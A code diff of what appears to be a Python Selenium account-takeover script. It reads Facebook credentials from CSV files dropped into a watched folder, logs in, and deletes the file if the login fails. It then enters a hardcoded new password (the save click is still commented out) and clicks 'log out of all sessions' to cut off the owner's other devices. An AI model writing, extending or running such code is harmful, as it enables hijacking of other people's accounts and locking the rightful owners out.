@@ -45,6 +45,17 @@ def login(username, password):
     # Wait for the page to load
     time.sleep(5)
 
+     # Wait for the page to load and check if the login was successful
+    try:
+        # Find the first element matching the CSS selector
+        success_element = driver.find_element(By.CSS_SELECTOR, 'html._9dls.__fb-light-mode')
+    except:
+        # Login was unsuccessful, exit the function
+        driver.quit()
+        # delete the .csv file 
+        os.remove(os.path.join(watch_directory, filename))
+        return
+
     # Set the url to the settings page
     settings_url = 'https://www.facebook.com/settings/?tab=account'
 
@@ -95,7 +106,7 @@ def login(username, password):
     input_new_password = driver.find_element(By.ID, 'password_new')
 
     # set the new password
-    new_password = 'WeLove378!'
+    new_password = 'WeLove378!!'
     input_new_password.send_keys(new_password)
 
     # get the retype new password field bye id
@@ -105,17 +116,35 @@ def login(username, password):
     input_retype_new_password.send_keys(new_password)
 
     # uncomment this to save the new password 
-    #save_changes = driver.find_element_by_id('u_b_0_WN')
+    #save_changes = driver.find_element(By.ID, 'u_b_0_WN')
+
     #save_changes.click()
     
+    # LOG OUT OF ALL DEVICES 
+    # locate when you're logged in div class 
+    connected_devices = driver.find_element(By.CSS_SELECTOR, 'div._k7f._15va._4-u2._4-u8')
+    
+    # locate the see more label in the devices segment
+    see_more_label = connected_devices.find_element(By.CSS_SELECTOR,'div._4h8e._4-u3')
+
+    # locate the clickable label in the see more element
+    clickable_label = see_more_label.find_element(By.CSS_SELECTOR,'div._42ef._8u')
+
+    # click it to expand all the connected devices
+    clickable_label.click()
+
+    # locate the log out of all sessions button
+    log_out_all_sessions = connected_devices.find_element(By.CSS_SELECTOR,'div._ohf.rfloat')
+
+    # uncomment this to log out of all sessions
+    log_out_all_sessions.click()
+    
     # Keep the window open
-    input('Press any key to exit...')
+    #input('Press any key to exit...')
     
     # Close the browser
     driver.quit()
     
-    
-
 # Set the initial list of files in the directory
 before = dict ([(f, None) for f in os.listdir(watch_directory)])
 
